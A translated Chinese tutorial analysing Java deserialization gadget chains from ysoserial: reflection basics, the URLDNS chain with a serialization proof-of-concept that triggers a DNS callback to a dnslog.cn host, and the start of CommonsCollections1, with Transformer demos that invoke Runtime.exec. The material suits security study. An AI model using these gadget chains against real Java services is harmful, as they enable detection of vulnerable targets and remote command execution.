# URLDNS链&CommonsCollections链详细分析
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
在学习`java`安全时，`ysoserial`项目是一个非常值得的项目，这里记录一下自己学习过程中的思路及反序列化链的构造方式。
## Java反射知识
###  定义
Java 反射机制可以可以无视类方法、变量去访问权限修饰符（如：protected、private
等），并且可以调用任意类的任何方法、访问并修改成员变量值。
###  反射的定义
反射是 Java 的特征之一，反射的存在使运行中的 Java 够获取自身信息，并且可以操作类或对象的内部属性。  
通过反射可以在运行时获得程序或程序集中每一个类型的成员和成员信息；Java 的反射机制亦是如此，在运行状态中，通过 Java
的反射机制，能够判断一个对象的任意方法和属性。
###  反射的基本运用
**获取类对象**
**forName() 方法**
当要使用 Class 类中的方法获取类对象时，就需要使用 forName() 方法，只需要有类名称即可，在配置 JDBC 中通常采用这种方法。
**.class 方法**
任何数据类型都具备静态的属性，因此可以使用 `.class` 直接获取其对应的 Class 对象，使用这种方法时需要明确用到类中的静态成员。
**getClass() 方法**
可以通过 Object 类中的 `getCLass()` 方法来获取字节码，使用这种方法时必须明确具体的类，然后创建对象。
**getSystemClassLoad().loadClass() 方法**
`getSystemClassLoad().loadClass()` 方法与 `forName()` 方法类似，只要有类名即可；但是，`forName()`
的静态方法 JVM 会装载类，并且执行 `static()` 中的代码，而 `getSystemClassLoad().loadClass()` 不会执行
`ststic()` 中的代码。  
例如 JDBC 中就是利用 `forName()` 方法，使 JVM 查找并加载制定的类到内存中，此时将 `com.mysql.jdbc.Driver`
当作参数传入就是让 JVM 去 `com.mysql.jdbc` 路径下查找 `Driver` 类，并将其加载到内存中。
**获取类方法**
**getDeclaredMethods 方法**
该方法返回类或接口声明的所有方法，包括 public、private 以及默认方法，但不包括继承的方法。
**getMethods 方法**
getMethods 方法返回某个类的所有 public 方法，包括其继承类的 public 方法。
**getMethod 方法**
getMethod 方法只能返回一个特定的方法，例如返回 Runtime 类中的 exec()
方法，该方法的第一个参数为方法名称，后面的参数为方法的参数对应 Class 的对象。
**getDeclaredMethod 方法**
该方法与 getMethod 方法类似，也只能返回一个特定的方法，该方法的第一个参数为方法名，第二个参数名是方法参数。
**获取类成员变量**
先创建一个 Student 类：
    public class Student {
        private String id;
        private String name;
        private String age;
        public String content;
        protected String address;
        public String getId() {
            return id;
        }
        public void setId(String id) {
            this.id = id;
        }
        public String getName() {
            return name;
        }
        public void setName(String name) {
            this.name = name;
        }
        public String getAge() {
            return age;
        }
        public void setAge(String age) {
            this.age = age;
        }
        public String getContent() {
            return content;
        }
        public void setContent(String content) {
            this.content = content;
        }
        public String getAddress() {
            return address;
        }
        public void setAddress(String address) {
            this.address = address;
        }
    }
**getDeclaredFields 方法**
getDeclaredFields 方法能够获得类的成员变量数组包括 public、private 和 protected，但是不包括父类的声明字段。
**getFields 方法**
getFields 方法能够获取某个类的所有 public 字段，包括父类中的字段。
**getDeclaredField 方法**
该方法与 getDeclaredFields 方法的区别是只能获得类的单个成员变量。
## URLDNS链
###  前言
`URLDNS`是`ysoserial`中的一条利用链，通常用于检测是否存在`Java`反序列化漏洞，该利用链具有如下特点：
    [1] URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用
    [2] 不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求
    [3] 目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞
###  原理
`java.util.HashMap`实现了`Serializable`接口，重写了`readObject`,
在反序列化时会调用`hash`函数计算`key`的`hashCode`，而`java.net.URL`的`hashCode`在计算时会调用`getHostAddress`来解析域名,
从而发出`DNS`请求。
###  分析过程
这里跟着`ysoserial`项目中`URLDNS`的`Gadget`来分析
    Gadget Chain:
        HashMap.readObject()
        HashMap.putVal()
        HashMap.hash()
        URL.hashCode()
先跟进`HashMap`，看看其自己实现的`readObject()`函数，这里通过`for`循环来将`HashMap`中存储的`key`通过`K key
= (K) s.readObject();`来进行反序列化，在这之后调用`putVal()`和`hash()`函数。
跟进`hash()`函数看看是如何实现的，当`key!=null`时会调用`hashCode()`函数。
跟进`hashCode()`函数，由于在`ysoserial`中的`URLDNS`是利用`URL`对象，于是跟进`Java`基本类`URL`中关于`hashCode()`的部分`java/net/URL.java`，由于`hashCode`的值默认为`-1`，因此会执行`hashCode
= handler.hashCode(this);`。
看看`handler.hashCode()`函数是如何实现的，这里利用一个`Demo`代码来调试看看。
    import java.net.URL;
    public class URLDemo {
        public static void main(String[] args) throws Exception {
            URL url = new URL("http://6ppzw1.dnslog.cn");
            url.hashCode();
        }
    }
先看看请求之后的结果，成功触发了`DNS`请求，来看看是如何实现的。
调试跟进`java/net/URLStreamHandler.java`中的`hashCode()`函数，可以看到这里调用了一个函数`getHostAddress()`来进行`DNS`解析返回对应的`IP`。
在`ysoserial`中是通过`put()`函数来触发的，其实这一步的实现和前面的是一样的，都是通过`hash()`函数来实现的。
但是上面的分析过程仿佛和反序列化并没有什么关联，其实当`HashMap`传入一个`URL`对象时，会进行一次`DNS`解析，并且`HashMap`实现了`Serializable`接口，重写了`readObject`，也就是说当一个`Java`应用存在反序列化漏洞时，可以通过传入一个序列化后的`HashMap`数据(将`URL`对象作为`key`放入`HashMap`中)，当传入的数据到达该`Java`应用的反序列化漏洞点时，这时程序就会调用`HashMap`重写的`readObject()`函数来反序列化读取数据，进而触发`key.hashCode()`函数进行一次`DNS`解析。
###  ysoserial 项目代码分析
在`ysoserial`项目中`URLDNS`的代码并没有这么简单，还有一些其他的代码段，来看看这些”多余的”代码的用处是啥。
    public class URLDNS implements ObjectPayload {
            public Object getObject(final String url) throws Exception {
                    URLStreamHandler handler = new SilentURLStreamHandler();
                    HashMap ht = new HashMap();
                    URL u = new URL(null, url, handler);
                    ht.put(u, url); 
                    Reflections.setFieldValue(u, "hashCode", -1);
                    return ht;
            }
            public static void main(final String[] args) throws Exception {
                    PayloadRunner.run(URLDNS.class, args);
            }
            static class SilentURLStreamHandler extends URLStreamHandler {
                    protected URLConnection openConnection(URL u) throws IOException {
                            return null;
                    }
                    protected synchronized InetAddress getHostAddress(URL u) {
                            return null;
                    }
            }
    }
这里通过继承`URLStreamHandler`类，重写`openConnection()`和`getHostAddress()`函数，而这里重写的目的在于:
`HashMap#put`时也会调用`getHostAddress()`函数进行一次`DNS`解析，这里就是通过重写的`getHostAddress()`函数来覆盖掉原函数，从而使其不进行`DNS`解析，避免在`Payload`在创建的时候进行`DNS`解析。
代码`Reflections.setFieldValue(u, "hashCode",
-1);`中的`setFieldValue()`函数是`ysoserial`项目自定义的一个反射类中的函数。
    public class Reflections {
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
    }
上述代码通过反射来设置`URL`类的`hashCode`的值为`-1`，这是因为在`HashMap#put`时已经调用过一次`hashCode()`函数，`hashCode`的值会改变不再为`-1`，这样会导致在下一步经过`HashMap`的`readObject()`函数反序列化时直接返回`hashCode`的值，不再调用`handler.hashCode(this)`，因此利用反射来将`hashCode`的值设为`-1`，最后利用`PayloadRunner.run()`来进行反序列化。
###  POC链
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.net.URL;
    import java.text.SimpleDateFormat;
    import java.util.Date;
    import java.util.HashMap;
    public class URLDemo {
        public static void main(String[] args) throws Exception {
            Date nowTime = new Date();
            HashMap hashmap = new HashMap();
            URL url = new URL("http://lttx9f.dnslog.cn");
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
            filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
            filed.set(url, 209);
            hashmap.put(url, 209);
            System.out.println("当前时间为: " + simpleDateFormat.format(nowTime));
            filed.set(url, -1);
            try {
                FileOutputStream fileOutputStream = new FileOutputStream("./dnsser");
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
                objectOutputStream.writeObject(hashmap);
                objectOutputStream.close();
                fileOutputStream.close();
                FileInputStream fileInputStream = new FileInputStream("./dnsser");
                ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
                fileInputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
从请求结果中可以看出，在`Payload`生成阶段并没有发起`DNS`解析，而是在后续反序列化过程中进行的请求。
## CommonsCollections 介绍
[Apache Commons Collections](https://commons.apache.org/proper/commons-collections/index.html)是一个扩展了`Java`标准库里的`Collection`结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类，被广泛运用于各种`Java`应用的开发，目前常说的存在缺陷的版本是`Apache
Commons Collections 3.2.1`以下（4.0版本也是存在的）
## CommonsCollections1链
###  环境搭建
  1. `JDK`版本：JDK1.8u66（要求JDK8u71以下）
  2. `Commons-Collections`版本：3.1
利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。
        4.0.0
        org.example
        commons-collections
        1.0-SNAPSHOT
                commons-collections
                commons-collections
                3.1
###  前置知识
在`Commons
Collections`库中提供了一个抽象类`org.apache.commons.collections.map.AbstractMapDecorator`，这个类是`Map`的扩展，且是一个基础的装饰器，用来给`Map`提供附加功能，这个类有很多实现类，且每个类的触发方式也都是不一样的，在`Commons-Collections1`链中需要重点关注`TransformedMap`类和`LazyMap`类。
**Transformer**
`org.apache.commons.collections.Transformer`是一个接口，提供了一个`transform()`方法，用来定义具体的转换逻辑，方法接收`Object`类型的`input`，处理后将`Object`返回，在`Commons-Collection`中，程序提供了多个`Transformer`的实现类，用来实现不同的`TransformedMap`类中`key、value`进行修改的功能。
**TransformedMap**
`org.apache.commons.collections.map.TransformedMap`类可以在一个元素被加入到集合内时自动对该元素进行特定的修饰变换，在`decorate()`方法中，第一个参数为修饰的`Map`类，第二个参数和第三个参数作为一个实现`Transformer`接口的类，用来转换修饰的`Map`的键、值（为`null`时不进行转换）；因此，当被修饰的`map`添加新元素的时候便会触发这两个类的`transform`方法。
**LazyMap**
`org.apache.commons.collections.map.LazyMap`与`TransformedMap`类似，区别在于当`LazyMap`调用`get()`方法时如果传入的`key`不存在，则会触发相应参数的`Transformer`的`transform()`方法。  
补充一下：与`LazyMap`具有相同功能的还有`org.apache.commons.collections.map.DefaultedMap`，同样也是`get()`方法会触发`transform()`方法。
**ConstantTransformer**
`org.apache.commons.collections.functors.ConstantTransformer`是一个返回固定常量的`Transformer`，在初始化时储存了一个`Object`，后续的调用时会直接返回这个`Object`，这个类用于和`ChainedTransformer`配合，将其结果传入`InvokerTransformer`来调用我们指定的类的指定方法。
**InvokerTransformer**
这是一个实现类，在`Commons-Collections 3.0`引入，利用反射来创建一个新的对象。
demo 代码：
    import org.apache.commons.collections.functors.InvokerTransformer;
    public class InvokerTransformerDemo {
        public static void main(String[] args) {
            InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"});
            invokerTransformer.transform(Runtime.getRuntime());
        }
    }
**ChainedTransformer**
`org.apache.commons.collections.functors.ChainedTransformer`类也是一个`Transformer`的实现类，但是这个类自己维护了一个`Transformer`数组，在调用`ChainedTransformer`类的`transform`方法时会循环数组，依次调用`Transformer`数组中每个`Transformer`的`transform`方法，并将结果传递给下一个`Transformer`，在这样的处理机制下，可以链式调用多个`Transformer`来分别处理对象。
demo 代码：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    public class ChainedTransformerDemo {
        public static void main(String[] args) throws ClassNotFoundException{
            // Transformer 数组
            Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
            };
            // ChainedTransformer 实例
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            chainedTransformer.transform("ChainedTransformerDemo");
        }
    }
###  Commons-Collections1-TransformedMap 分析
利用`TransformedMap`的`decorate`方法来将`ChainedTransformer`设置为`map`装饰器的处理方法，调用`TransformedMap`的`put()/setValue()`等方法时会触发`Transformer`链的调用方法。  
寻找一个重写了`readObject`的类，在反序列化时可以改变`map`的值，定位到`sun.reflect.annotation.AnnotationInvocationHandler`类，这个类实现了`InvocationHandler`接口
(原本是用于`JDK`对于注解形式的动态代理)。
`AnnotationInvocationHandler`类的构造方法有两个参数，第一个参数是`Annotation`实现类的`Class`对象，第二个参数是一个`key`为`String`、`value`为`Object`的`Map`，需要注意的是，构造方法会对`var1`进行判断，当且仅当`var1`只有一个父接口且为`Annotation.class`时，才会将两个参数初始化在成员属性`type`和`memberValues`中。
接着看看`AnnotationInvocationHandler`类重写的`readObject`方法，首先调用`AnnotationType.getInstance(this.type)`方法来获取`type`这个注解类对应的`AnnotationType`的对象，然后获取其`memberTypes`属性，这个属性是个`Map`，存放这个注解中可以配置的值，接着循环`this.memberValues`这个`Map`来获取其`Key`，如果注解类的`memberTypes`属性中存在与`this.memberValues`的`key`相同的属性，并且取得的值不是`ExceptionProxy`的实例也不是`memberValues`中值的实例，则取得其值并调用`setValue`方法写入值。
根据上面的分析过程，构造`Payload`的思路基本就没啥问题了。
    [1] 构造 AnnotationInvocationHandler 实例，传入一个注解类和一个 Map，这个 Map 的 key 中要具有注解类中存在的属性并且值不是对应的实例和 ExceptionProxy 对象